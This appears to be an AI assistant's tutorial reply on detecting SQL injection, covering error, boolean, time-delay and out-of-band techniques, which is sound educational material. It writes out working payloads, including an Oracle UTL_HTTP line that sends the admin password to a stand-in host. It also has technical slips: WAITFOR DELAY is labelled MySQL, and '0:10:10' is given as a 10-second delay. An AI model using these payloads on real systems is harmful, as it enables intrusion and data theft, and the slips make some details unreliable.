Excellent. You've provided a perfect summary of the official methodology, which mirrors the PortSwigger/Web Security Academy materials. You've correctly outlined both the manual approach (the "scientific method" of web security testing) and the use of automated tools like Burp Scanner.

Let's break down *why* each of these manual tests works, as understanding the underlying mechanism is key to being a effective tester.

### Deep Dive into Your Manual Detection Techniques

#### 1. The Single Quote (`'`) and Error Anomalies
- **Why it works:** This is the simplest "fuzzing" test. In SQL, the single quote is a string delimiter. If the application takes your input and places it directly into a SQL query without proper escaping, your single quote will break the defined string structure.
- **What to look for:**
    - **Database Errors:** You might see a full-blown error page like `You have an error in your SQL syntax...` or `Unclosed quotation mark...`. This is a massive red flag, as it not only confirms the vulnerability but often reveals database type (e.g., MySQL, Microsoft SQL).
    - **Behavioral Changes:** The page might load without any styling, return no results, or behave in a way that is distinct from the normal, error-free state. A missing product or a blank page can be just as telling as an explicit error message.

#### 2. SQL-Specific Syntax (String Concatenation)
- **Why it works:** This test exploits how databases handle string manipulation. It's a more subtle test that can work even when error messages are suppressed.
- **The Concept:** You submit two distinct values that should, logically, result in the same underlying query.
    1.  **Original Value:** `?userid=123`
    2.  **Test Value 1 (Same):** `?userid=123` -> The application behaves normally.
    3.  **Test Value 2 (Different):** `?userid=123'+'456` (or `'123' || '456'` in Oracle)
- **Analysis:** If the application is vulnerable, the database might concatenate `123` and `456` to form `123456`, and then look for a record with ID `123456`. If the application then behaves *differently* (e.g., shows a different product or a "not found" message), it proves your input was interpreted as SQL code. If it's secure (using parameterized queries), it would literally search for the string `123' + '456` and behave the same way as it would for any other non-existent ID.

#### 3. Boolean Conditions (`OR 1=1` vs. `OR 1=2`)
- **Why it works:** This is a masterclass in inference. You're not trying to break the query; you're trying to change its logic in a predictable way.
- **The Test:**
    1.  **True Condition:** `?category=Gifts' OR '1'='1` (This will always be true).
    2.  **False Condition:** `?category=Gifts' OR '1'='2` (This will always be false).
- **Analysis:**
    - **Vulnerable:** The response to the first payload might show *all* items (because the condition is always true), while the second payload shows only the items in the 'Gifts' category (or none, if the 'Gifts' part is now false). This systematic difference proves you can manipulate the query's logic.
    - **Secure:** A secure application would treat the entire input as a single, literal search string. It would look for a category literally named `Gifts' OR '1'='1`, find nothing, and return the same "no results" page for *both* payloads.

#### 4. Time Delays
- **Why it works:** This is a critical technique for "blind" SQL injection, where you don't see data or error messages on the page.
- **The Concept:** You inject a command that forces the database to pause for a known period.
    - **MySQL/MSSQL:** `' ; WAITFOR DELAY '0:10:10'--`
    - **PostgreSQL:** `' ; SELECT pg_sleep(10)--`
- **Analysis:** You send the request and measure the time it takes for the server to respond. If the response is delayed by exactly 10 seconds (or more, depending on network latency), you have confirmed that your input was executed by the SQL server. There is no other reason for a simple web request to pause for that long.

#### 5. Out-of-Band (OAST) Interactions
- **Why it works:** This is the most powerful technique for the most severe cases of blind SQL injection, where the application is asynchronous or the database server is firewalled from direct return traffic.
- **The Concept:** You force the database to initiate a *new* network connection to a server you control (e.g., your Burp Collaborator instance).
    - **Example (Oracle):** `' || (SELECT UTL_HTTP.request('your-server.com/'||(SELECT password FROM users WHERE username='admin')) FROM dual) ||'`
- **Analysis:** If your server logs show a request from the target database server (e.g., `GET /admin_password_hash HTTP/1.1`), you have 100% confirmation of a SQL injection vulnerability. It proves command execution *and* can be used to exfiltrate data, even in the most restrictive environments.

### Automation vs. Manual Testing

You are absolutely correct that tools like **Burp Scanner** are the most efficient way to find the *majority* of SQL injection flaws. They can run through thousands of these test cases in seconds.

However, manual testing is what separates a good security engineer from a great one. It is essential for:
- **Complex Business Logic:** Finding SQL injection in custom, multi-step processes that an automated scanner cannot easily navigate (e.g., a discount code workflow that involves a database lookup).
- **Bypassing WAFs (Web Application Firewalls):** Crafting subtle payloads that evade signature-based detection.
- **Chained Exploits:** Understanding the *context* of the SQL injection to combine it with other vulnerabilities for a more impactful attack.

In summary, your summary is flawless. You've laid out the complete toolkit for detection, from the simple smash-and-grab quote test to the surgical precision of OAST.